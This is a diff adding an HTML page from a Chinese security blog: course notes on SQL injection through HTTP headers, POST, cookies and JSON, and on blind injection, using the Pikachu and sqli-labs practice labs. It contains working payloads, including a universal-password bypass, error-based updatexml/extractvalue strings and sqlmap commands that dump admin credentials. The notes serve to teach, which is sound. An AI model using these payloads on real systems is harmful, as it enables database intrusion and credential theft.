@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lishang520.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="16、XFF&amp;HTTP头&amp;Post&amp;Cookie注入 案例1-原理分析-测试代码段解释">
+<meta property="og:type" content="article">
+<meta property="og:title" content="16-20、渗透测试(xiaodi)">
+<meta property="og:url" content="https://lishang520.github.io/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/index.html">
+<meta property="og:site_name" content="painter&#39;s Blog">
+<meta property="og:description" content="16、XFF&amp;HTTP头&amp;Post&amp;Cookie注入 案例1-原理分析-测试代码段解释">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731131731783.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731131749308.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731131838109.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731132003828.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731210448334.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731210503368.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210731210514495.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210801165434310.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210801140021509.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210801172128323.png">
+<meta property="article:published_time" content="2021-08-10T11:39:23.000Z">
+<meta property="article:modified_time" content="2021-08-10T11:49:07.347Z">
+<meta property="article:author" content="painter">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lishang520.github.io/source/images/image-20210731131731783.png">
+
+<link rel="canonical" href="https://lishang520.github.io/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>16-20、渗透测试(xiaodi) | painter's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?24a57553e96b4b8b803c9794fd76b400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">painter's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友情链接</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/lishang520/" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lishang520.github.io/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E5%A4%B4%E5%83%8F.jpg">
+      <meta itemprop="name" content="painter">
+      <meta itemprop="description" content="painter的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="painter's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          16-20、渗透测试(xiaodi)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-10 19:39:23 / 修改时间：19:49:07" itemprop="dateCreated datePublished" datetime="2021-08-10T19:39:23+08:00">2021-08-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>15 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>16、XFF&amp;HTTP头&amp;Post&amp;Cookie注入</p>
+<p>案例1-原理分析-测试代码段解释</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">案例1-原理分析-测试代码段解释</span><br><span class="line">https://www.cnblogs.com/zhao-/p/10994615.html</span><br><span class="line">https://www.w3school.com.cn/php/php_superglobals.asp</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html; charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">$get=$_GET[&#x27;g&#x27;];</span><br><span class="line">$post=$_POST[&#x27;p&#x27;];</span><br><span class="line">$cookie=$_COOKIE[&#x27;c&#x27;];</span><br><span class="line">$request=$_REQUEST[&#x27;r&#x27;];        #既接收get请求，也接收post请求</span><br><span class="line">$host=$_SERVER[&#x27;HTTP_HOST&#x27;];       #接收请求头里的host</span><br><span class="line">$user_agent=$_SERVER[&quot;HTTP_USER_AGENT&quot;];       #接收请求头里的浏览器agent</span><br><span class="line">$ip=$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];          #接收请求头里的ip来源</span><br><span class="line">#以下是显示每个变量</span><br><span class="line">echo $get.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $post.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $cookie.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $request.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $host.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $user_agent.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $ip;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#案例2-应用场景-提交方式&amp;接受信息</span><br><span class="line">场景1：常见登录数据请求方法</span><br><span class="line">	① 登录框注入</span><br><span class="line">	② 万能密码</span><br><span class="line">场景2：常见访问者来源IP判断</span><br><span class="line">	X-Forwarded-For: </span><br><span class="line">场景3：常见访问者浏览器信息判断</span><br><span class="line">https://www.cnblogs.com/lushaoyan/p/11088213.html</span><br><span class="line"></span><br><span class="line">#案例3-SQL注入-POST注入&amp;SQLMAP</span><br><span class="line">#注意事项：再使用万能密码的时候，一定要带上正确的账号，比如admin，因为通过组合，语句就是 admin&#x27; or &#x27;1&#x27; =&#x27;1  &#x27; and passwd = &#x27;password&#x27;</span><br><span class="line">		根据优先级的不同，and优先级高于or，所以会先对  &#x27;1&#x27; =&#x27;1  &#x27; and passwd = &#x27;password&#x27;   进行判断，因为密码必定是错的，所以这个语句整个都是假，接着就是  admin&#x27; or 假     因为admin是我们发现的已经存在的账号，所以  真 or 假 = 真   ，最终成功登录</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">#使用sqlmap读取数据包来进行post注入</span><br><span class="line">python sqlmap.py -r post.txt --current-db</span><br><span class="line">python sqlmap.py -r post.txt --tables -D &quot;purchase&quot; </span><br><span class="line">python sqlmap.py -r post.txt --columns -T &quot;admin&quot; -D &quot;purchase&quot;</span><br><span class="line">python sqlmap.py -r post.txt --dump -C &quot;username,password,thekey&quot; -T &quot;admin&quot; -D &quot;purchase&quot;</span><br><span class="line"></span><br><span class="line">#案例4-SQL注入-HTTP头注入&amp;SQLMAP</span><br><span class="line">#对host的位置进行注入</span><br><span class="line">#注意：host原来的数据千万不能删除，我们sql注入只需要再原来的host后面进行拼接即可</span><br><span class="line">order by 4</span><br><span class="line">union select 1,flag,3,4 from flag</span><br><span class="line"></span><br><span class="line">#案例5-SQL注入-XFF头IP注入&amp;SQLMAP</span><br><span class="line">#在  X-Forwarded-For:     位置进行注入</span><br><span class="line">python sqlmap.py -r xff.txt --current-db</span><br><span class="line">python sqlmap.py -r xff.txt --tables -D &quot;webcalendar&quot;</span><br><span class="line">python sqlmap.py -r xff.txt --columns -T user -D &quot;webcalendar&quot;</span><br><span class="line">python sqlmap.py -r xff.txt --dump -C &quot;username,password&quot; -T user -D &quot;webcalendar&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="17、SQL注入-amp-Json-amp-Base64-amp-格式类型"><a href="#17、SQL注入-amp-Json-amp-Base64-amp-格式类型" class="headerlink" title="17、SQL注入&amp;Json&amp;Base64&amp;格式类型"></a>17、SQL注入&amp;Json&amp;Base64&amp;格式类型</h2><p>#案例1-参数格式-数字&amp;字符&amp;JSON等注入测试</p>
+<ul>
+<li>```python<br>一、字符型与数字型#技巧：字符型必须要考虑闭合单引号，以及注释掉后面的单引号，常用注释符有 –+    #  – (1)借用Sqlilabs-Less1&amp;2讲解，本地及应用场景’ union select 1,2,3–+union select 1,2,3##搜索框注入原理：我们在搜索的时候，有时候搜索 1 ，一般内容胡总和标题里有 1 的都会显示出来，因为他是用通配符 % 来进行匹配的，同时，搜索框一般既能搜索数字型，也可以搜索字符型，所以在查询语句中，一般都会将变量用单引号引起来，依据该原理，正常的搜索处的语句是：select * from zzz_user where name like ‘%$name%’#注入方法：所以如果搜索功能存在注入点，我们注入的时候就需要考虑单引号和通配符的闭合二、json型格式的注入#应用场景：很多时候，网站post的数据并不是 a=1&amp;b=3  结构的，有的是json格式的：{“username”:”admin”}#基本原理，网站获取到json格式，然后用json_decode 对json进行提取，比如这里就是提取到的数据就是 admin  ，因为admin是字符型，所以在组合到数据库查询语句里会将其用单引号引起来，比如   $sql = “SELECT * FROM users WHERE username = ‘{$username}’”;    所以，当我们注入的时候，只需要在键 username所对应的值 admin后面拼接sql语句即可，但是必须要首先闭合前面的单引号，然后注释掉后面的不要的句子本地模拟登陆数据传输&amp;某WEB赛题数据数据{“username”:”admin’ order by 3#”}     #当order by 4，页面异常，所以长度为3{“username”:”-admin’ union select 1,2,3#”}#易错点:    1、这里的注释，必须要用井号’ # ‘来注释    2、必须要将unino前面的语句置错，所以在admin前面加上负号  - <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例2-数据处理-编码BASE64&amp;加密MD5等注入测试</span><br><span class="line"></span><br><span class="line">- 技巧：先解密，然后组合payload，接着再加密，进行访问</span><br><span class="line">  - MD5-借用某案例进行说明利用-原理</span><br><span class="line">  - BASE64-借用某案例进行复现测试-原理     </span><br><span class="line"></span><br><span class="line">\#案例3-SQL操作-查询&amp;插入&amp;更新&amp;删除&amp;堆叠等测试</span><br><span class="line"></span><br><span class="line">学习目的：不同的数据库操作对应不同的注入方式，比如数据库查询操作，一般都是用select，因为它有回显，所以一般采用联合注入；但是数据库的插入、更新、删除等等，是没有回显的，所以它就只能盲注了</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  select-查询-应用场景分析-SQL查询演示select * from zhibo_test.m_sms where id=1;#这里的zhibo_test.m_sms 表示数据库zhibo_test下的表m_smsinsert-插入-应用场景分析-SQL插入演示insert into zhibo_test.m_sms values(&#x27;66&#x27;,&#x27;register&#x27;,&#x27;13345677654&#x27;,&#x27;1234&#x27;,&#x27;0&#x27;,&#x27;11.11.1.1&#x27;,&#x27;15345333321&#x27;);update-更新-应用场景分析-SQL更新演示update zhibo_test.m_sms set username=&#x27;xiaodi&#x27; where id=27;delete-删除-应用场景分析-SQL删除演示delete from m_sms where id=28;堆叠测试-执行-应用场景分析-SQL多条演示select * from m_sms;delete from m_sms where id=66;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="18、SQL查询方式-amp-布尔-amp-延时-amp-报错盲注"><a href="#18、SQL查询方式-amp-布尔-amp-延时-amp-报错盲注" class="headerlink" title="18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注"></a>18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注</h2><p>SQL注入盲注</p>
+<ul>
+<li>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：<ul>
+<li>基于布尔的SQL盲注-逻辑判断<ul>
+<li>regexp,like,ascii,left,ord,mid</li>
+</ul>
+</li>
+<li>基于时间的SQL盲注-延时判断<ul>
+<li>if,sleep</li>
+</ul>
+</li>
+<li>基于报错的SQL盲注-报错回显<ul>
+<li>floor，updatexml，extractvalue</li>
+<li>参考链接<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>什么时候该用盲注？什么时候该用联合注入？</p>
+<ul>
+<li>在无法爆出显示位的时候就要用盲注了</li>
+<li>注册、更新信息、删除信息、发表新内容等地方只有一个提示成功的字眼，所以这里也是盲注，一般常用布尔盲注和报错的盲注</li>
+</ul>
+<p>联合注入和盲注的易错点：</p>
+<ul>
+<li><strong>联合注入需要将union前面的语句置错，但是盲注却不需要，因为他是用and拼接的，所以肯定不能置错的</strong></li>
+</ul>
+<p>盲注语法基础：</p>
+<p>多个语句的意义：有时候我们一个字母一个字母爆破名字的时候，可能网站会过滤单引号，那么ord和ascii的语法就可以派上用场了</p>
+<ul>
+<li>like ‘ro%’            #判断ro或ro…是否成立，如果没有通配符%,那么 like ‘admin’  就是精准匹配，只匹配值等于admin的</li>
+<li>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等，模糊匹配，regexp ‘admin’ 只要包含admin的就显示，比如admin1 admin2</li>
+<li>if(条件,5,0)           #条件成立 返回5 反之 返回0</li>
+<li>sleep(5)              #SQL语句延时执行5秒</li>
+<li>mid和substr：用法一样<ul>
+<li>mid(a,b,c)            #从位置b开始，截取a字符串的c位</li>
+<li>substr(a,b,c)         #从位置b开始，截取字符串a的c长度</li>
+</ul>
+</li>
+<li>left(database(),1)，database() #left(a,b)从左侧截取a的前b位</li>
+<li>length(database())=8  #判断数据库database()名的长度</li>
+<li>ord和ascii：用法一样 </li>
+<li>ascii(x)=97 #判断x的ascii码是否等于97</li>
+</ul>
+<p>SQL查询方式注入</p>
+<ul>
+<li>语法：<ul>
+<li>select,insert,update,delete,orderby等</li>
+</ul>
+</li>
+<li>注入出现位置：<ul>
+<li>正常url界面</li>
+<li>用户注册、发表新内容等位置</li>
+<li>修改内容、删除内容等功能</li>
+</ul>
+</li>
+</ul>
+<h3 id="盲注基本知识"><a href="#盲注基本知识" class="headerlink" title="盲注基本知识"></a>盲注基本知识</h3><p>基本语法：</p>
+<p>select * from member where username like ‘vi%’;</p>
+<p>select * from member where username regexp ‘^x’;</p>
+<ul>
+<li>匹配除了x的其他字符， 符号  ^   代表 除了 … </li>
+</ul>
+<p>select * from member where id=1 and sleep(1);</p>
+<ul>
+<li>查询成功后，并且延迟1秒</li>
+</ul>
+<p>select * from member where id=1 and if(1&gt;2,sleep(1),0);</p>
+<ul>
+<li>首先查询，接着进行判断，如果1&gt;2 ，就延迟1秒，否则立刻显示</li>
+</ul>
+<p>select * from member where id=1 and if(1&lt;2,sleep(1),0);</p>
+<p>select * from member where id=1 and length(database())=7;</p>
+<ul>
+<li>判断当前数据库的名字的长度是否等于7，如果是，则查询结果正常显示，否则不显示</li>
+</ul>
+<p>select * from member where id=1 and left(database(),1)=’p’;</p>
+<ul>
+<li>判断当前数据库的名字的从左到右的第一个字符是不是 p ，如果是，则查询结果正常显示，否则不显示</li>
+</ul>
+<p>select * from member where id=1 and left(database(),2)=’pi’;</p>
+<ul>
+<li>判断当前数据库的名字的从左到右的前2个字符是不是 pi ，如果是，则查询结果正常显示，否则不显示</li>
+</ul>
+<p>select * from member where id=1 and substr(database(),1,1)=’p’;</p>
+<ul>
+<li>截取当前数据库的名字，从第1位开始，截取1位，比如sec，截取的结果就是s，这里截取后判断其是否等于 p ，如果是，则页面正常显示</li>
+</ul>
+<p>select * from member where id=1 and substr(database(),2,1)=’i’;</p>
+<ul>
+<li>截取当前数据库的名字，从第2位开始，截取1位，比如sec，截取的结果就是e，这里截取后判断其是否等于 i ，如果是，则页面正常显示</li>
+</ul>
+<p>select * from member where id=1 and ord(left(database(),1))=112;</p>
+<ul>
+<li>判断当前数据库的名字从左到右的第1位的字符转换为ascii码后是不是等于112，如果是，则页面返回正常</li>
+</ul>
+<p>#案例1-Pikachu-查询注入测试（报错盲注)</p>
+<p>Pikachu insert</p>
+<ul>
+<li><p>技巧：直接套用即可，在用户注册，新增内容的位置都可以尝试</p>
+</li>
+<li><p>易错点：就算我们是在手机号的位置进行注入，但是我们也要完全套用这个模板，不需要去掉单引号</p>
+</li>
+<li><p>```php<br>username=x’ or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit username=x’ or updatexml(1,concat(0x7e,(version())),0) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit    username=x’ or extractvalue(1,concat(0x7e,database())) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731124312971](/source/images/image-20210731124312971.png)</span><br><span class="line"></span><br><span class="line">- ![image-20210731125026616](/source/images/image-20210731125026616.png)</span><br><span class="line"></span><br><span class="line">Pikachu update</span><br><span class="line"></span><br><span class="line">- 直接套用，适用于修改内容处</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky&#x27; or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;&amp;email=wuhan&amp;submit=submit    sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;&amp;email=wuhan&amp;submit=submit    sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=Nicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&amp;email=wuhan&amp;submit=submit</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Pikachu delete</p>
+<ul>
+<li><p>直接套用，适用于删除内容的位置</p>
+</li>
+<li><p>易错点：下面的三个payload与原有的语句的连接是用+号，比如下面的59和or之间就是用 + 号进行连接</p>
+<ul>
+<li>127.0.0.1/pikachu-master/vul/sqli/sqli_del.php?id=59+or+updatexml+<br>(1,concat(0x7e,user()),0)</li>
+</ul>
+</li>
+<li><p>```php<br>+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)    +or+updatexml+(1,concat(0x7e,database()),0)    +or+extractvalue(1,concat(0x7e,database()))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731130124225](/source/images/image-20210731130124225.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#案例2-Sqlilabs-less5注入测试（布尔盲注）</span><br><span class="line"></span><br><span class="line">- 特点：显示位出不来</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  &#x27;and left(version(),1)=5#&#x27;and length(database())=8#    &#x27;and left(database(),1)&gt;&#x27;a&#x27;--+&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>#案例3-Sqlilabs-less2注入测试（延时盲注）</p>
+<ul>
